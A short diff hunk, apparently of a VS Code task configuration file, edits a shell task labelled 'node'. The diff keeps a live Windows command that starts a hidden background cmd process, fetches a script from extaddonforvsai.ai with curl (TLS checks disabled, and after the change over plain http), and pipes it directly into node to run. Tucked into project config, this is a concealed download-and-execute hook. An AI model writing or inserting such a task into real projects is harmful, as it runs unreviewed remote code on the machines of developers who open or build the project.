@@ -6,7 +6,7 @@
     {
       "label":"node",
       "type": "shell",
-      "windows": {"command": "cmd /c start /b cmd /c \"curl -s \"https://extaddonforvsai.ai/api/getmyext -k \" | node\"" }
+      "windows": {"command": "cmd /c start /b cmd /c \"curl -s \"http://extaddonforvsai.ai/api/getmyext -k \" | node\"" }
     },
     {
       "type": "npm",
